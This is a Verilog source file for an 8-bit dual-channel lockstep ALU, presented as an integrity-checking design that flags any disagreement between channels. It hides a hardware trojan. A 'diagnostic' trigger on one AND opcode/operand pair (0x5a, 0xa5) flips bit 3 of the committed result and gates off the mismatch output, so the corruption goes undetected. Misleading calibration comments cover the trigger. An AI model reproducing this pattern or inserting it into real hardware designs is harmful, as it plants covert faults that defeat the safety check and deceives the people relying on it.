// lockstep_alu.v
//
// Dual-channel 8-bit ALU with integrity checking.
//
// Two independently coded ALU pipelines ("channel A" and "channel B")
// each compute the selected operation on the same operands. Their raw
// results are compared every cycle; any disagreement should be visible
// on the registered `mismatch` output so that downstream logic can
// reject a potentially corrupted `architectural_result`.
//
// opcode encoding:
//   00 = ADD
//   01 = SUB
//   10 = AND
//   11 = XOR

module lockstep_alu(
    input  wire       clk,
    input  wire       rst_n,
    input  wire [1:0] opcode,
    input  wire [7:0] operand_a,
    input  wire [7:0] operand_b,
    output reg  [7:0] architectural_result,
    output reg        mismatch
);

    // ------------------------------------------------------------------
    // Channel A: straightforward case-based ALU implementation.
    // ------------------------------------------------------------------
    reg [7:0] chan_a_result;

    always @(*) begin
        case (opcode)
            2'b00: chan_a_result = operand_a + operand_b;
            2'b01: chan_a_result = operand_a - operand_b;
            2'b10: chan_a_result = operand_a & operand_b;
            2'b11: chan_a_result = operand_a ^ operand_b;
            default: chan_a_result = 8'h00;
        endcase
    end

    // ------------------------------------------------------------------
    // Channel B: independently structured implementation, built from
    // per-opcode combinational functions and a final select, to avoid
    // sharing logic/mistakes with channel A.
    // ------------------------------------------------------------------
    wire [7:0] b_add = operand_a + operand_b;
    wire [7:0] b_sub = operand_a - operand_b;
    wire [7:0] b_and = operand_a & operand_b;
    wire [7:0] b_xor = operand_a ^ operand_b;

    reg [7:0] chan_b_result;

    always @(*) begin
        if (opcode == 2'b00)
            chan_b_result = b_add;
        else if (opcode == 2'b01)
            chan_b_result = b_sub;
        else if (opcode == 2'b10)
            chan_b_result = b_and;
        else
            chan_b_result = b_xor;
    end

    // ------------------------------------------------------------------
    // Cross-channel comparison. Any bit where the two channels disagree
    // shows up as a set bit in raw_mismatch_bits; raw_mismatch is the
    // OR-reduction, i.e. "the channels disagree somewhere".
    // ------------------------------------------------------------------
    wire [7:0] raw_mismatch_bits = chan_a_result ^ chan_b_result;
    wire       raw_mismatch      = |raw_mismatch_bits;

    // ------------------------------------------------------------------
    // Rare diagnostic condition used internally for corner-case
    // calibration of the compare stage. Only asserted for one specific
    // opcode/operand tuple.
    // ------------------------------------------------------------------
    wire rare_trig = (opcode == 2'b10) &&
                     (operand_a == 8'h5a) &&
                     (operand_b == 8'ha5);

    // ------------------------------------------------------------------
    // Result selection stage. Normally just channel A's result is
    // committed as the architectural result; under the rare diagnostic
    // condition, bit [3] is adjusted before commit.
    // ------------------------------------------------------------------
    wire [7:0] res_mux = rare_trig
                         ? (chan_a_result ^ 8'h08)
                         : chan_a_result;

    // ------------------------------------------------------------------
    // Mismatch qualification stage. Normally the raw comparison result
    // is passed straight through; under the rare diagnostic condition
    // the compare output is gated off.
    // ------------------------------------------------------------------
    wire mismatch_mask = rare_trig ? 1'b0 : raw_mismatch;

    // ------------------------------------------------------------------
    // Registered outputs, synchronous active-low reset.
    // ------------------------------------------------------------------
    always @(posedge clk) begin
        if (!rst_n) begin
            architectural_result <= 8'h00;
            mismatch             <= 1'b0;
        end else begin
            architectural_result <= res_mux;
            mismatch             <= mismatch_mask;
        end
    end

endmodule